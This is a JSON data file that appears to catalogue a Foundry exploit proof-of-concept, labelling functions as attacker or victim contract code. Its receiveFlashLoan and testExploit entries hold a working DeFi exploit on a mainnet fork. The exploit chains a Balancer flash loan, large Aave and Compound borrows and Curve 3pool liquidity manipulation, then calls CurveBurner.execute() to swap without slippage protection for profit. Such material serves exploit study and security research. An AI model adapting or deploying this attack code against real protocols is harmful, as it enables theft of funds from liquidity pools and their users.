[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        wstETH.approve(address(aaveV3), wstETH.balanceOf(address(this)));\n        aaveV3.supply(address(wstETH), wstETH.balanceOf(address(this)), address(this), 0); // deposit wstETH to aaveV3\n        aaveV3.borrow(address(USDT), 40_000_000 * 1e6, 2, 0, address(this)); // borrow USDT from aaveV3\n\n        WETH.approve(address(aaveV2), WETH.balanceOf(address(this)));\n        aaveV2.deposit(address(WETH), 50_000 ether, address(this), 0); // deposit WETH to aaveV2\n        aaveV2.borrow(address(USDT), 65_000_000 * 1e6, 2, 0, address(this)); // borrow USDT from aaveV2\n\n        WETH.withdraw(29_000 ether);\n\n        address[] memory cTokens = new address[](2);\n        cTokens[0] = address(cETH);\n        cTokens[1] = address(cUSDT);\n        Cointroller.enterMarkets(cTokens); // enter cTokens market\n        cETH.mint{value: 29_000 ether}();\n        cUSDT.borrow(40_000_000 * 1e6); // borrow USDT from cUSDT\n\n        LP.approve(address(Curve3POOL), type(uint256).max);\n        USDC.approve(address(Curve3POOL), type(uint256).max);\n        DAI.approve(address(Curve3POOL), type(uint256).max);\n        TransferHelper.safeApprove(address(USDT), address(Curve3POOL), type(uint256).max);\n        TransferHelper.safeApprove(address(USDT), address(cUSDT), type(uint256).max);\n        TransferHelper.safeApprove(address(USDT), address(aaveV2), type(uint256).max);\n        TransferHelper.safeApprove(address(USDT), address(aaveV3), type(uint256).max);\n\n        uint256[3] memory amount;\n        amount[0] = 0;\n        amount[1] = 0;\n        amount[2] = USDT.balanceOf(address(this));\n        Curve3POOL.add_liquidity(amount, 1); // deposit USDT to Curve3POOL\n\n        amount[0] = DAI.balanceOf(address(Curve3POOL)) * 978 / 1000;\n        amount[1] = USDC.balanceOf(address(Curve3POOL)) * 978 / 1000;\n        amount[2] = 0;\n        Curve3POOL.remove_liquidity_imbalance(amount, LP.balanceOf(address(this))); // withdraw DAI and USDC from Curve3POOL\n\n        CurveBurner.execute(); // add only USDT liquidity to Curve3POOL -> swap USDT to DAI and USDC without slippage protection\n\n        amount[0] = DAI.balanceOf(address(this));\n        amount[1] = USDC.balanceOf(address(this));\n        amount[2] = 0;\n        Curve3POOL.add_liquidity(amount, 1); // deposit DAI and USDC to Curve3POOL\n\n        Curve3POOL.remove_liquidity_one_coin(LP.balanceOf(address(this)), 2, 1); // withdraw USDT from Curve3POOL\n\n        cUSDT.repayBorrow(cUSDT.borrowBalanceCurrent(address(this))); // repay USDT to cUSDT\n        cETH.redeemUnderlying(29_000 ether); // withdraw ETH from cETH\n\n        WETH.deposit{value: 29_000 ether}();\n        aaveV2.repay(address(USDT), 65_000_000 * 1e6, 2, address(this)); // repay USDT to aaveV2\n        aaveV2.withdraw(address(WETH), 50_000 ether, address(this)); // withdraw WETH from aaveV2\n\n        aaveV3.repay(address(USDT), 40_000_000 * 1e6, 2, address(this)); // repay USDT to aaveV3\n        aaveV3.withdraw(address(wstETH), type(uint256).max, address(this)); // withdraw wstETH from aaveV3\n\n        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);\n        IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);\n        TransferHelper.safeTransfer(tokens[2], msg.sender, amounts[2] + feeAmounts[2]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17_823_542);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(CurveBurner), \"CurveBurner\");\n        vm.label(address(Curve3POOL), \"Curve3POOL\");\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(wstETH), \"wstETH\");\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(LP), \"LP\");\n        vm.label(address(cETH), \"cETH\");\n        vm.label(address(cUSDT), \"cUSDT\");\n        vm.label(address(Balancer), \"Balancer\");\n        vm.label(address(aaveV2), \"aaveV2\");\n        vm.label(address(aaveV3), \"aaveV3\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        deal(address(this), 0);\n\n        address[] memory tokens = new address[](3);\n        tokens[0] = address(wstETH);\n        tokens[1] = address(WETH);\n        tokens[2] = address(USDT);\n        uint256[] memory amounts = new uint256[](3);\n        amounts[0] = 35_986 ether;\n        amounts[1] = 79_768 ether;\n        amounts[2] = 10_744_911 * 1e6;\n        bytes memory userData = \"\";\n        Balancer.flashLoan(address(this), tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ICurve",
    "source_type": "victim_contract",
    "function_name": "add_liquidity",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurve",
    "source_type": "victim_contract",
    "function_name": "remove_liquidity_imbalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurve",
    "source_type": "victim_contract",
    "function_name": "remove_liquidity_one_coin",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurveBurner",
    "source_type": "victim_contract",
    "function_name": "execute",
    "original_code": "",
    "description": ""
  }
]